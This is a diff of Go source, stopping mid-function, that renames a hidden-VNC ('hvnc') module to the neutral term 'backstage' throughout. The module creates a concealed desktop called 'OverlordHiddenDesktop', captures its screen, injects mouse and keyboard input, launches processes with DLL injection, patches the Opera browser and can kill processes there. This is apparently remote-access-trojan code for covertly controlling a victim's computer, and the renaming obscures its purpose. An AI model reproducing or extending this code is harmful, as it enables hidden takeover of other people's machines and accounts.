@@ -31,8 +31,8 @@ var (
 	procGetWindow                = user32.NewProc("GetWindow")
 	procGetTopWindow             = user32.NewProc("GetTopWindow")
 	procCreateProcessW           = kernel32.NewProc("CreateProcessW")
-	procSendInputHVNC            = user32.NewProc("SendInput")
-	procGetCursorPosHVNC         = user32.NewProc("GetCursorPos")
+	procSendInputbackstage            = user32.NewProc("SendInput")
+	procGetCursorPosbackstage         = user32.NewProc("GetCursorPos")
 	procWindowFromPoint          = user32.NewProc("WindowFromPoint")
 	procScreenToClient           = user32.NewProc("ScreenToClient")
 	procPostMessageW             = user32.NewProc("PostMessageW")
@@ -152,70 +152,70 @@ const (
 )
 
 var (
-	hvncDesktopHandle   uintptr
-	hvncDesktopMu       sync.Mutex
-	hvncDesktopName     = "OverlordHiddenDesktop"
-	hvncInitialized     bool
-	hvncOriginalDesktop uintptr
-	hvncCursorEnabled   bool
-	hvncThreadOnce      sync.Once
-	hvncThreadErr       error
-	hvncThreadReady     chan struct{}
-	hvncThreadTasks     chan hvncTask
-	hvncWatchdogOnce    sync.Once
-	hvncNoWindowLogNs   atomic.Int64
-	hvncInputMu         sync.Mutex
-	hvncLastCursor      point
-	hvncHasCursor       bool
-	hvncWorkingWindow   uintptr
-	hvncShiftDown       bool
-	hvncCtrlDown        bool
-	hvncAltDown         bool
-	hvncCapsLock        bool
-	hvncMovingWindow    bool
-	hvncMoveOffset      point
-	hvncWindowSize      point
-	hvncWindowToMove    uintptr
-	hvncMouseButtons    uint32
-	hvncPendingActivate uintptr
-	hvncExplorerStarted bool
-	hvncTaskSeq         atomic.Uint64
-	hvncCurrentTaskID   atomic.Uint64
-	hvncCurrentTaskKind atomic.Int64
-	hvncCurrentTaskNs   atomic.Int64
-	hvncLastScale       atomic.Uint64 // float64 bits — scale used by last HVNC capture
+	backstageDesktopHandle   uintptr
+	backstageDesktopMu       sync.Mutex
+	backstageDesktopName     = "OverlordHiddenDesktop"
+	backstageInitialized     bool
+	backstageOriginalDesktop uintptr
+	backstageCursorEnabled   bool
+	backstageThreadOnce      sync.Once
+	backstageThreadErr       error
+	backstageThreadReady     chan struct{}
+	backstageThreadTasks     chan backstageTask
+	backstageWatchdogOnce    sync.Once
+	backstageNoWindowLogNs   atomic.Int64
+	backstageInputMu         sync.Mutex
+	backstageLastCursor      point
+	backstageHasCursor       bool
+	backstageWorkingWindow   uintptr
+	backstageShiftDown       bool
+	backstageCtrlDown        bool
+	backstageAltDown         bool
+	backstageCapsLock        bool
+	backstageMovingWindow    bool
+	backstageMoveOffset      point
+	backstageWindowSize      point
+	backstageWindowToMove    uintptr
+	backstageMouseButtons    uint32
+	backstagePendingActivate uintptr
+	backstageExplorerStarted bool
+	backstageTaskSeq         atomic.Uint64
+	backstageCurrentTaskID   atomic.Uint64
+	backstageCurrentTaskKind atomic.Int64
+	backstageCurrentTaskNs   atomic.Int64
+	backstageLastScale       atomic.Uint64 // float64 bits — scale used by last backstage capture
 
 	// Capture cache: pooled DC/DIB per window to avoid per-frame allocation
-	hvncWinCache     map[uintptr]*hvncWinCacheEntry
-	hvncWinCachePrev []byte
+	backstageWinCache     map[uintptr]*backstageWinCacheEntry
+	backstageWinCachePrev []byte
 
-	hvncCompHdcMem uintptr
-	hvncCompHbmp   uintptr
-	hvncCompBits   unsafe.Pointer
-	hvncCompW      int
-	hvncCompH      int
+	backstageCompHdcMem uintptr
+	backstageCompHbmp   uintptr
+	backstageCompBits   unsafe.Pointer
+	backstageCompW      int
+	backstageCompH      int
 
-	hvncPendingMouseMove *hvncTask
-	hvncPendingMoveMu    sync.Mutex
+	backstagePendingMouseMove *backstageTask
+	backstagePendingMoveMu    sync.Mutex
 )
 
-type hvncTaskKind int
+type backstageTaskKind int
 
 const (
-	hvncTaskCapture hvncTaskKind = iota
-	hvncTaskStartProcess
-	hvncTaskStartProcessInjected
-	hvncTaskMouseMove
-	hvncTaskMouseDown
-	hvncTaskMouseUp
-	hvncTaskKeyDown
-	hvncTaskKeyUp
-	hvncTaskMouseWheel
-	hvncTaskAutoStartExplorer
+	backstageTaskCapture backstageTaskKind = iota
+	backstageTaskStartProcess
+	backstageTaskStartProcessInjected
+	backstageTaskMouseMove
+	backstageTaskMouseDown
+	backstageTaskMouseUp
+	backstageTaskKeyDown
+	backstageTaskKeyUp
+	backstageTaskMouseWheel
+	backstageTaskAutoStartExplorer
 )
 
-type hvncTask struct {
-	kind            hvncTaskKind
+type backstageTask struct {
+	kind            backstageTaskKind
 	id              uint64
 	display         int
 	filePath        string
@@ -229,10 +229,10 @@ type hvncTask struct {
 	searchPath      string
 	replacePath     string
 	queuedAt        time.Time
-	resp            chan hvncTaskResult
+	resp            chan backstageTaskResult
 }
 
-type hvncTaskResult struct {
+type backstageTaskResult struct {
 	img *image.RGBA
 	err error
 	pid uint32
@@ -275,7 +275,7 @@ type mouseInput struct {
 	dwExtraInfo uintptr
 }
 
-type hvncWinCacheEntry struct {
+type backstageWinCacheEntry struct {
 	hdcMem uintptr
 	hbmp   uintptr
 	bits   unsafe.Pointer
@@ -327,18 +327,18 @@ func getTopWindow(hwnd uintptr) uintptr {
 	return r
 }
 
-func InitializeHVNCDesktop() error {
-	hvncDesktopMu.Lock()
-	defer hvncDesktopMu.Unlock()
+func InitializebackstageDesktop() error {
+	backstageDesktopMu.Lock()
+	defer backstageDesktopMu.Unlock()
 
-	if hvncInitialized && hvncDesktopHandle != 0 {
+	if backstageInitialized && backstageDesktopHandle != 0 {
 		return nil
 	}
 
 	threadId := getCurrentThreadId()
-	hvncOriginalDesktop = getThreadDesktop(threadId)
+	backstageOriginalDesktop = getThreadDesktop(threadId)
 
-	desktopNamePtr, err := syscall.UTF16PtrFromString(hvncDesktopName)
+	desktopNamePtr, err := syscall.UTF16PtrFromString(backstageDesktopName)
 	if err != nil {
 		return fmt.Errorf("failed to convert desktop name: %v", err)
 	}
@@ -365,79 +365,79 @@ func InitializeHVNCDesktop() error {
 		}
 	}
 
-	hvncDesktopHandle = r
-	hvncInitialized = true
+	backstageDesktopHandle = r
+	backstageInitialized = true
 	return nil
 }
 
-func CleanupHVNCDesktop() {
-	hvncDesktopMu.Lock()
-	defer hvncDesktopMu.Unlock()
+func CleanupbackstageDesktop() {
+	backstageDesktopMu.Lock()
+	defer backstageDesktopMu.Unlock()
 
-	hvncCleanupFrameReaders()
+	backstageCleanupFrameReaders()
 
-	hvncFreeCapCache()
+	backstageFreeCapCache()
 
-	for _, entry := range hvncWinCache {
-		hvncFreeCacheEntry(entry)
+	for _, entry := range backstageWinCache {
+		backstageFreeCacheEntry(entry)
 	}
-	hvncWinCache = nil
-	hvncWinCachePrev = nil
+	backstageWinCache = nil
+	backstageWinCachePrev = nil
 
-	if hvncCompHbmp != 0 {
-		deleteObject(hvncCompHbmp)
-		hvncCompHbmp = 0
+	if backstageCompHbmp != 0 {
+		deleteObject(backstageCompHbmp)
+		backstageCompHbmp = 0
 	}
-	if hvncCompHdcMem != 0 {
-		deleteDC(hvncCompHdcMem)
-		hvncCompHdcMem = 0
+	if backstageCompHdcMem != 0 {
+		deleteDC(backstageCompHdcMem)
+		backstageCompHdcMem = 0
 	}
-	hvncCompBits = nil
-	hvncCompW = 0
-	hvncCompH = 0
+	backstageCompBits = nil
+	backstageCompW = 0
+	backstageCompH = 0
 
-	hvncInputMu.Lock()
-	hvncShiftDown = false
-	hvncCtrlDown = false
-	hvncAltDown = false
-	hvncCapsLock = false
-	hvncMouseButtons = 0
-	hvncHasCursor = false
-	hvncWorkingWindow = 0
-	hvncInputMu.Unlock()
-	hvncLastScale.Store(0)
+	backstageInputMu.Lock()
+	backstageShiftDown = false
+	backstageCtrlDown = false
+	backstageAltDown = false
+	backstageCapsLock = false
+	backstageMouseButtons = 0
+	backstageHasCursor = false
+	backstageWorkingWindow = 0
+	backstageInputMu.Unlock()
+	backstageLastScale.Store(0)
 
-	if hvncDesktopHandle != 0 {
-		if hvncOriginalDesktop != 0 {
-			procSetThreadDesktop.Call(hvncOriginalDesktop)
+	if backstageDesktopHandle != 0 {
+		if backstageOriginalDesktop != 0 {
+			procSetThreadDesktop.Call(backstageOriginalDesktop)
 		}
 
-		procCloseDesktop.Call(hvncDesktopHandle)
-		hvncDesktopHandle = 0
+		procCloseDesktop.Call(backstageDesktopHandle)
+		backstageDesktopHandle = 0
 	}
-	hvncInitialized = false
-	hvncExplorerStarted = false
+	backstageInitialized = false
+	backstageExplorerStarted = false
 
 	uiaCleanup()
 	uiaClearActiveElement()
 	resetWinUI3Cache()
 	resetInputSiteCache()
 
-	if hvncThreadTasks != nil {
-		close(hvncThreadTasks)
-		hvncThreadTasks = nil
+	if backstageThreadTasks != nil {
+		close(backstageThreadTasks)
+		backstageThreadTasks = nil
 	}
-	hvncThreadReady = nil
-	hvncThreadErr = nil
-	hvncThreadOnce = sync.Once{}
-	hvncWatchdogOnce = sync.Once{}
+	backstageThreadReady = nil
+	backstageThreadErr = nil
+	backstageThreadOnce = sync.Once{}
+	backstageWatchdogOnce = sync.Once{}
 }
 
-func SetHVNCCursorCapture(enabled bool) {
-	hvncCursorEnabled = enabled
+func SetbackstageCursorCapture(enabled bool) {
+	backstageCursorEnabled = enabled
 }
 
-func hvncDesktopBounds() (image.Rectangle, bool) {
+func backstageDesktopBounds() (image.Rectangle, bool) {
 	hwnd, _, _ := procGetDesktopWindow.Call()
 	if hwnd == 0 {
 		return image.Rectangle{}, false
@@ -453,115 +453,115 @@ func hvncDesktopBounds() (image.Rectangle, bool) {
 	return image.Rect(int(r.left), int(r.top), int(r.right), int(r.bottom)), true
 }
 
-func ensureHVNCThread() error {
-	hvncDesktopMu.Lock()
-	desktopHandle := hvncDesktopHandle
-	hvncDesktopMu.Unlock()
+func ensurebackstageThread() error {
+	backstageDesktopMu.Lock()
+	desktopHandle := backstageDesktopHandle
+	backstageDesktopMu.Unlock()
 
 	if desktopHandle == 0 {
-		return fmt.Errorf("hvnc desktop not initialized")
+		return fmt.Errorf("backstage desktop not initialized")
 	}
 
-	hvncThreadOnce.Do(func() {
-		hvncThreadReady = make(chan struct{})
-		hvncThreadTasks = make(chan hvncTask)
-		hvncWatchdogOnce.Do(func() {
+	backstageThreadOnce.Do(func() {
+		backstageThreadReady = make(chan struct{})
+		backstageThreadTasks = make(chan backstageTask)
+		backstageWatchdogOnce.Do(func() {
 			go func() {
-				defer recoverAndLog("hvnc watchdog", nil)
-				hvncThreadWatchdog()
+				defer recoverAndLog("backstage watchdog", nil)
+				backstageThreadWatchdog()
 			}()
 		})
 		go func(handle uintptr) {
-			defer recoverAndLog("hvnc desktop thread", nil)
+			defer recoverAndLog("backstage desktop thread", nil)
 			runtime.LockOSThread()
 			defer runtime.UnlockOSThread()
 
 			r, _, err := procSetThreadDesktop.Call(handle)
 			if r == 0 {
-				hvncThreadErr = fmt.Errorf("failed to set thread desktop: %v", err)
-				close(hvncThreadReady)
-				for task := range hvncThreadTasks {
-					task.resp <- hvncTaskResult{err: hvncThreadErr}
+				backstageThreadErr = fmt.Errorf("failed to set thread desktop: %v", err)
+				close(backstageThreadReady)
+				for task := range backstageThreadTasks {
+					task.resp <- backstageTaskResult{err: backstageThreadErr}
 				}
 				return
 			}
 
-			close(hvncThreadReady)
-			for task := range hvncThreadTasks {
+			close(backstageThreadReady)
+			for task := range backstageThreadTasks {
 				start := time.Now()
-				hvncCurrentTaskID.Store(task.id)
-				hvncCurrentTaskKind.Store(int64(task.kind))
-				hvncCurrentTaskNs.Store(start.UnixNano())
+				backstageCurrentTaskID.Store(task.id)
+				backstageCurrentTaskKind.Store(int64(task.kind))
+				backstageCurrentTaskNs.Store(start.UnixNano())
 
-				if shouldTraceHVNCTask(task.kind) {
-					log.Printf("hvnc task: start id=%d kind=%s queued=%s details=%s", task.id, hvncTaskKindName(task.kind), start.Sub(task.queuedAt).Round(time.Millisecond), hvncTaskDetails(task))
+				if shouldTracebackstageTask(task.kind) {
+					log.Printf("backstage task: start id=%d kind=%s queued=%s details=%s", task.id, backstageTaskKindName(task.kind), start.Sub(task.queuedAt).Round(time.Millisecond), backstageTaskDetails(task))
 				}
 
-				var result hvncTaskResult
+				var result backstageTaskResult
 				switch task.kind {
-				case hvncTaskStartProcess:
-					result.pid, result.err = startHVNCProcessOnThread(task.filePath, task.display)
-				case hvncTaskStartProcessInjected:
-					result.pid, result.err = startHVNCProcessInjectedOnThread(task.filePath, task.dllBytes, task.captureDllBytes, task.searchPath, task.replacePath, task.display)
-				case hvncTaskMouseMove:
-					result.err = hvncMouseMoveOnThread(task.display, task.x, task.y)
-				case hvncTaskMouseDown:
-					result.err = hvncMouseButtonOnThread(task.button, true)
-				case hvncTaskMouseUp:
-					result.err = hvncMouseButtonOnThread(task.button, false)
-				case hvncTaskKeyDown:
-					result.err = hvncKeyOnThread(task.vk, true)
-				case hvncTaskKeyUp:
-					result.err = hvncKeyOnThread(task.vk, false)
-				case hvncTaskMouseWheel:
-					result.err = hvncMouseWheelOnThread(task.delta)
-				case hvncTaskAutoStartExplorer:
-					result.err = hvncAutoStartExplorerOnThread()
+				case backstageTaskStartProcess:
+					result.pid, result.err = startbackstageProcessOnThread(task.filePath, task.display)
+				case backstageTaskStartProcessInjected:
+					result.pid, result.err = startbackstageProcessInjectedOnThread(task.filePath, task.dllBytes, task.captureDllBytes, task.searchPath, task.replacePath, task.display)
+				case backstageTaskMouseMove:
+					result.err = backstageMouseMoveOnThread(task.display, task.x, task.y)
+				case backstageTaskMouseDown:
+					result.err = backstageMouseButtonOnThread(task.button, true)
+				case backstageTaskMouseUp:
+					result.err = backstageMouseButtonOnThread(task.button, false)
+				case backstageTaskKeyDown:
+					result.err = backstageKeyOnThread(task.vk, true)
+				case backstageTaskKeyUp:
+					result.err = backstageKeyOnThread(task.vk, false)
+				case backstageTaskMouseWheel:
+					result.err = backstageMouseWheelOnThread(task.delta)
+				case backstageTaskAutoStartExplorer:
+					result.err = backstageAutoStartExplorerOnThread()
 				default:
 					result.img, result.err = BackstageCaptureDisplayOnThread(task.display)
 				}
 
 				dur := time.Since(start)
-				if shouldTraceHVNCTask(task.kind) || dur > 400*time.Millisecond {
+				if shouldTracebackstageTask(task.kind) || dur > 400*time.Millisecond {
 					if result.err != nil {
-						log.Printf("hvnc task: done id=%d kind=%s dur=%s err=%v", task.id, hvncTaskKindName(task.kind), dur.Round(time.Millisecond), result.err)
+						log.Printf("backstage task: done id=%d kind=%s dur=%s err=%v", task.id, backstageTaskKindName(task.kind), dur.Round(time.Millisecond), result.err)
 					} else {
-						log.Printf("hvnc task: done id=%d kind=%s dur=%s", task.id, hvncTaskKindName(task.kind), dur.Round(time.Millisecond))
+						log.Printf("backstage task: done id=%d kind=%s dur=%s", task.id, backstageTaskKindName(task.kind), dur.Round(time.Millisecond))
 					}
 				}
 
-				hvncCurrentTaskNs.Store(0)
-				hvncCurrentTaskKind.Store(-1)
-				hvncCurrentTaskID.Store(0)
+				backstageCurrentTaskNs.Store(0)
+				backstageCurrentTaskKind.Store(-1)
+				backstageCurrentTaskID.Store(0)
 				task.resp <- result
 			}
 		}(desktopHandle)
 	})
 
-	if hvncThreadReady != nil {
-		<-hvncThreadReady
+	if backstageThreadReady != nil {
+		<-backstageThreadReady
 	}
 
-	return hvncThreadErr
+	return backstageThreadErr
 }
 
 func BackstageCaptureDisplay(display int) (*image.RGBA, error) {
-	if err := ensureHVNCThread(); err != nil {
+	if err := ensurebackstageThread(); err != nil {
 		return nil, err
 	}
 
-	resp := make(chan hvncTaskResult, 1)
-	hvncThreadTasks <- hvncTask{kind: hvncTaskCapture, display: display, resp: resp}
+	resp := make(chan backstageTaskResult, 1)
+	backstageThreadTasks <- backstageTask{kind: backstageTaskCapture, display: display, resp: resp}
 	result := <-resp
 	return result.img, result.err
 }
 
-func StartHVNCProcess(filePath string, operaPatch bool, display int) error {
+func StartbackstageProcess(filePath string, operaPatch bool, display int) error {
 	if filePath == "" {
 		return fmt.Errorf("empty file path")
 	}
-	result, err := executeHVNCTask(hvncTask{
-		kind:     hvncTaskStartProcess,
+	result, err := executebackstageTask(backstageTask{
+		kind:     backstageTaskStartProcess,
 		filePath: strings.TrimSpace(filePath),
 		display:  display,
 	}, 10*time.Second)
@@ -573,19 +573,19 @@ func StartHVNCProcess(filePath string, operaPatch bool, display int) error {
 	}
 	if operaPatch && result.pid != 0 {
 		go func() {
-			defer recoverAndLog("hvnc patch opera", nil)
+			defer recoverAndLog("backstage patch opera", nil)
 			patchOperaAsync(result.pid, 5, 2*time.Second)
 		}()
 	}
 	return nil
 }
 
-func HVNCKillAll() error {
-	hvncDesktopMu.Lock()
-	deskHandle := hvncDesktopHandle
-	hvncDesktopMu.Unlock()
+func BackstageKillAll() error {
+	backstageDesktopMu.Lock()
+	deskHandle := backstageDesktopHandle
+	backstageDesktopMu.Unlock()
 	if deskHandle == 0 {
-		return fmt.Errorf("HVNC desktop not initialized")
+		return fmt.Errorf("backstage desktop not initialized")
 	}
 
 	pids := make(map[uint32]struct{})
@@ -609,16 +609,16 @@ func HVNCKillAll() error {
 			killed++
 		}
 	}
-	log.Printf("hvnc: kill all: terminated %d processes across %d pids", killed, len(pids))
+	log.Printf("backstage: kill all: terminated %d processes across %d pids", killed, len(pids))
 	return nil
 }
 
-func HVNCAutoStartExplorer() error {
-	if hvncExplorerStarted {
+func BackstageAutoStartExplorer() error {
+	if backstageExplorerStarted {
 		return nil
 	}
-	result, err := executeHVNCTask(hvncTask{
-		kind: hvncTaskAutoStartExplorer,
+	result, err := executebackstageTask(backstageTask{
+		kind: backstageTaskAutoStartExplorer,
 	}, 15*time.Second)
 	if err != nil {
 		return err
@@ -626,154 +626,154 @@ func HVNCAutoStartExplorer() error {
 	return result.err
 }
 
-func HVNCInputMouseMove(display int, x, y int32) error {
-	result, err := executeHVNCTask(hvncTask{kind: hvncTaskMouseMove, display: display, x: x, y: y}, 3*time.Second)
+func BackstageInputMouseMove(display int, x, y int32) error {
+	result, err := executebackstageTask(backstageTask{kind: backstageTaskMouseMove, display: display, x: x, y: y}, 3*time.Second)
 	if err != nil {
 		return err
 	}
 	return result.err
 }
 
-func HVNCInputMouseDown(button int) error {
-	result, err := executeHVNCTask(hvncTask{kind: hvncTaskMouseDown, button: button}, 3*time.Second)
+func BackstageInputMouseDown(button int) error {
+	result, err := executebackstageTask(backstageTask{kind: backstageTaskMouseDown, button: button}, 3*time.Second)
 	if err != nil {
 		return err
 	}
 	return result.err
 }
 
-func HVNCInputMouseUp(button int) error {
-	result, err := executeHVNCTask(hvncTask{kind: hvncTaskMouseUp, button: button}, 3*time.Second)
+func BackstageInputMouseUp(button int) error {
+	result, err := executebackstageTask(backstageTask{kind: backstageTaskMouseUp, button: button}, 3*time.Second)
 	if err != nil {
 		return err
 	}
 	return result.err
 }
 
-func HVNCInputKeyDown(vk uint16) error {
-	result, err := executeHVNCTask(hvncTask{kind: hvncTaskKeyDown, vk: vk}, 3*time.Second)
+func BackstageInputKeyDown(vk uint16) error {
+	result, err := executebackstageTask(backstageTask{kind: backstageTaskKeyDown, vk: vk}, 3*time.Second)
 	if err != nil {
 		return err
 	}
 	return result.err
 }
 
-func HVNCInputKeyUp(vk uint16) error {
-	result, err := executeHVNCTask(hvncTask{kind: hvncTaskKeyUp, vk: vk}, 3*time.Second)
+func BackstageInputKeyUp(vk uint16) error {
+	result, err := executebackstageTask(backstageTask{kind: backstageTaskKeyUp, vk: vk}, 3*time.Second)
 	if err != nil {
 		return err
 	}
 	return result.err
 }
 
-func HVNCInputMouseWheel(delta int32) error {
-	result, err := executeHVNCTask(hvncTask{kind: hvncTaskMouseWheel, delta: delta}, 3*time.Second)
+func BackstageInputMouseWheel(delta int32) error {
+	result, err := executebackstageTask(backstageTask{kind: backstageTaskMouseWheel, delta: delta}, 3*time.Second)
 	if err != nil {
 		return err
 	}
 	return result.err
 }
 
-func executeHVNCTask(task hvncTask, timeout time.Duration) (hvncTaskResult, error) {
-	if err := ensureHVNCThread(); err != nil {
-		return hvncTaskResult{}, err
+func executebackstageTask(task backstageTask, timeout time.Duration) (backstageTaskResult, error) {
+	if err := ensurebackstageThread(); err != nil {
+		return backstageTaskResult{}, err
 	}
-	if hvncThreadTasks == nil {
-		return hvncTaskResult{}, fmt.Errorf("hvnc thread not available")
+	if backstageThreadTasks == nil {
+		return backstageTaskResult{}, fmt.Errorf("backstage thread not available")
 	}
 	if timeout <= 0 {
 		timeout = 3 * time.Second
 	}
 
-	task.resp = make(chan hvncTaskResult, 1)
-	task.id = hvncTaskSeq.Add(1)
+	task.resp = make(chan backstageTaskResult, 1)
+	task.id = backstageTaskSeq.Add(1)
 	task.queuedAt = time.Now()
 	timer := time.NewTimer(timeout)
 	defer timer.Stop()
 
 	select {
-	case hvncThreadTasks <- task:
+	case backstageThreadTasks <- task:
 	case <-timer.C:
-		log.Printf("hvnc input: task enqueue timeout id=%d kind=%s timeout=%s", task.id, hvncTaskKindName(task.kind), timeout)
-		return hvncTaskResult{}, fmt.Errorf("hvnc task queue timed out")
+		log.Printf("backstage input: task enqueue timeout id=%d kind=%s timeout=%s", task.id, backstageTaskKindName(task.kind), timeout)
+		return backstageTaskResult{}, fmt.Errorf("backstage task queue timed out")
 	}
 
 	select {
 	case result := <-task.resp:
 		return result, nil
 	case <-timer.C:
-		log.Printf("hvnc input: task execution timeout id=%d kind=%s timeout=%s", task.id, hvncTaskKindName(task.kind), timeout)
-		return hvncTaskResult{}, fmt.Errorf("hvnc task execution timed out")
+		log.Printf("backstage input: task execution timeout id=%d kind=%s timeout=%s", task.id, backstageTaskKindName(task.kind), timeout)
+		return backstageTaskResult{}, fmt.Errorf("backstage task execution timed out")
 	}
 }
 
-func hvncThreadWatchdog() {
+func backstageThreadWatchdog() {
 	ticker := time.NewTicker(2 * time.Second)
 	defer ticker.Stop()
 	for range ticker.C {
-		id := hvncCurrentTaskID.Load()
+		id := backstageCurrentTaskID.Load()
 		if id == 0 {
 			continue
 		}
-		startNs := hvncCurrentTaskNs.Load()
+		startNs := backstageCurrentTaskNs.Load()
 		if startNs == 0 {
 			continue
 		}
 		running := time.Since(time.Unix(0, startNs))
 		if running >= 2*time.Second {
-			kind := hvncTaskKindName(hvncTaskKind(hvncCurrentTaskKind.Load()))
-			log.Printf("hvnc watchdog: thread appears stuck id=%d kind=%s running=%s", id, kind, running.Round(time.Millisecond))
+			kind := backstageTaskKindName(backstageTaskKind(backstageCurrentTaskKind.Load()))
+			log.Printf("backstage watchdog: thread appears stuck id=%d kind=%s running=%s", id, kind, running.Round(time.Millisecond))
 		}
 	}
 }
 
-func shouldTraceHVNCTask(kind hvncTaskKind) bool {
+func shouldTracebackstageTask(kind backstageTaskKind) bool {
 	switch kind {
-	case hvncTaskMouseDown, hvncTaskMouseUp, hvncTaskKeyDown, hvncTaskKeyUp, hvncTaskMouseWheel, hvncTaskStartProcess, hvncTaskStartProcessInjected, hvncTaskAutoStartExplorer:
+	case backstageTaskMouseDown, backstageTaskMouseUp, backstageTaskKeyDown, backstageTaskKeyUp, backstageTaskMouseWheel, backstageTaskStartProcess, backstageTaskStartProcessInjected, backstageTaskAutoStartExplorer:
 		return true
 	default:
 		return false
 	}
 }
 
-func hvncTaskKindName(kind hvncTaskKind) string {
+func backstageTaskKindName(kind backstageTaskKind) string {
 	switch kind {
-	case hvncTaskCapture:
+	case backstageTaskCapture:
 		return "capture"
-	case hvncTaskStartProcess:
+	case backstageTaskStartProcess:
 		return "start_process"
-	case hvncTaskStartProcessInjected:
+	case backstageTaskStartProcessInjected:
 		return "start_process_injected"
-	case hvncTaskMouseMove:
+	case backstageTaskMouseMove:
 		return "mouse_move"
-	case hvncTaskMouseDown:
+	case backstageTaskMouseDown:
 		return "mouse_down"
-	case hvncTaskMouseUp:
+	case backstageTaskMouseUp:
 		return "mouse_up"
-	case hvncTaskKeyDown:
+	case backstageTaskKeyDown:
 		return "key_down"
-	case hvncTaskKeyUp:
+	case backstageTaskKeyUp:
 		return "key_up"
-	case hvncTaskMouseWheel:
+	case backstageTaskMouseWheel:
 		return "mouse_wheel"
-	case hvncTaskAutoStartExplorer:
+	case backstageTaskAutoStartExplorer:
 		return "auto_start_explorer"
 	default:
 		return fmt.Sprintf("unknown(%d)", kind)
 	}
 }
 
-func hvncTaskDetails(task hvncTask) string {
+func backstageTaskDetails(task backstageTask) string {
 	switch task.kind {
-	case hvncTaskMouseDown, hvncTaskMouseUp:
+	case backstageTaskMouseDown, backstageTaskMouseUp:
 		return fmt.Sprintf("button=%d", task.button)
-	case hvncTaskKeyDown, hvncTaskKeyUp:
+	case backstageTaskKeyDown, backstageTaskKeyUp:
 		return fmt.Sprintf("vk=%d", task.vk)
-	case hvncTaskMouseWheel:
+	case backstageTaskMouseWheel:
 		return fmt.Sprintf("delta=%d", task.delta)
-	case hvncTaskStartProcess:
+	case backstageTaskStartProcess:
 		return fmt.Sprintf("cmd=%q", task.filePath)
-	case hvncTaskStartProcessInjected:
+	case backstageTaskStartProcessInjected:
 		return fmt.Sprintf("cmd=%q search=%q replace=%q dllSize=%d", task.filePath, task.searchPath, task.replacePath, len(task.dllBytes))
 	default:
 		return ""
@@ -781,55 +781,55 @@ func hvncTaskDetails(task hvncTask) string {
 }
 
 var (
-	hvncCapHDCScreen uintptr
-	hvncCapHDCMem    uintptr
-	hvncCapHBMP      uintptr
-	hvncCapBits      unsafe.Pointer
-	hvncCapW         int
-	hvncCapH         int
-	hvncCapImg       *image.RGBA
+	backstageCapHDCScreen uintptr
+	backstageCapHDCMem    uintptr
+	backstageCapHBMP      uintptr
+	backstageCapBits      unsafe.Pointer
+	backstageCapW         int
+	backstageCapH         int
+	backstageCapImg       *image.RGBA
 )
 
-func hvncFreeCapCache() {
-	if hvncCapHBMP != 0 {
-		deleteObject(hvncCapHBMP)
-		hvncCapHBMP = 0
+func backstageFreeCapCache() {
+	if backstageCapHBMP != 0 {
+		deleteObject(backstageCapHBMP)
+		backstageCapHBMP = 0
 	}
-	if hvncCapHDCMem != 0 {
-		deleteDC(hvncCapHDCMem)
-		hvncCapHDCMem = 0
+	if backstageCapHDCMem != 0 {
+		deleteDC(backstageCapHDCMem)
+		backstageCapHDCMem = 0
 	}
-	if hvncCapHDCScreen != 0 {
-		releaseDC(0, hvncCapHDCScreen)
-		hvncCapHDCScreen = 0
+	if backstageCapHDCScreen != 0 {
+		releaseDC(0, backstageCapHDCScreen)
+		backstageCapHDCScreen = 0
 	}
-	hvncCapBits = nil
-	hvncCapW = 0
-	hvncCapH = 0
-	hvncCapImg = nil
+	backstageCapBits = nil
+	backstageCapW = 0
+	backstageCapH = 0
+	backstageCapImg = nil
 }
 
-func hvncEnsureCapCache(w, h int) (uintptr, uintptr, []byte, bool) {
-	if hvncCapHDCScreen == 0 {
-		hvncCapHDCScreen = getDC(0)
-		if hvncCapHDCScreen == 0 {
+func backstageEnsureCapCache(w, h int) (uintptr, uintptr, []byte, bool) {
+	if backstageCapHDCScreen == 0 {
+		backstageCapHDCScreen = getDC(0)
+		if backstageCapHDCScreen == 0 {
 			return 0, 0, nil, false
 		}
 	}
-	if hvncCapHDCMem != 0 && hvncCapW == w && hvncCapH == h && hvncCapBits != nil {
-		buf := unsafe.Slice((*byte)(hvncCapBits), w*h*4)
-		return hvncCapHDCScreen, hvncCapHDCMem, buf, true
+	if backstageCapHDCMem != 0 && backstageCapW == w && backstageCapH == h && backstageCapBits != nil {
+		buf := unsafe.Slice((*byte)(backstageCapBits), w*h*4)
+		return backstageCapHDCScreen, backstageCapHDCMem, buf, true
 	}
-	if hvncCapHBMP != 0 {
-		deleteObject(hvncCapHBMP)
-		hvncCapHBMP = 0
+	if backstageCapHBMP != 0 {
+		deleteObject(backstageCapHBMP)
+		backstageCapHBMP = 0
 	}
-	if hvncCapHDCMem != 0 {
-		deleteDC(hvncCapHDCMem)
-		hvncCapHDCMem = 0
+	if backstageCapHDCMem != 0 {
+		deleteDC(backstageCapHDCMem)
+		backstageCapHDCMem = 0
 	}
-	hvncCapHDCMem = createCompatibleDC(hvncCapHDCScreen)
-	if hvncCapHDCMem == 0 {
+	backstageCapHDCMem = createCompatibleDC(backstageCapHDCScreen)
+	if backstageCapHDCMem == 0 {
 		return 0, 0, nil, false
 	}
 	bmi := bitmapInfo{
@@ -842,18 +842,18 @@ func hvncEnsureCapCache(w, h int) (uintptr, uintptr, []byte, bool) {
 			biCompression: BI_RGB,
 		},
 	}
-	hvncCapHBMP = createDIBSection(hvncCapHDCMem, &bmi, DIB_RGB_COLORS, &hvncCapBits)
-	if hvncCapHBMP == 0 || hvncCapBits == nil {
-		deleteDC(hvncCapHDCMem)
-		hvncCapHDCMem = 0
+	backstageCapHBMP = createDIBSection(backstageCapHDCMem, &bmi, DIB_RGB_COLORS, &backstageCapBits)
+	if backstageCapHBMP == 0 || backstageCapBits == nil {
+		deleteDC(backstageCapHDCMem)
+		backstageCapHDCMem = 0
 		return 0, 0, nil, false
 	}
-	selectObject(hvncCapHDCMem, hvncCapHBMP)
-	hvncCapW = w
-	hvncCapH = h
-	hvncCapImg = nil
-	buf := unsafe.Slice((*byte)(hvncCapBits), w*h*4)
-	return hvncCapHDCScreen, hvncCapHDCMem, buf, true
+	selectObject(backstageCapHDCMem, backstageCapHBMP)
+	backstageCapW = w
+	backstageCapH = h
+	backstageCapImg = nil
+	buf := unsafe.Slice((*byte)(backstageCapBits), w*h*4)
+	return backstageCapHDCScreen, backstageCapHDCMem, buf, true
 }
 
 func BackstageCaptureDisplayOnThread(display int) (*image.RGBA, error) {
@@ -868,20 +868,20 @@ func BackstageCaptureDisplayOnThread(display int) (*image.RGBA, error) {
 		maxDisplays = 1
 	}
 	if display < 0 || display >= maxDisplays {
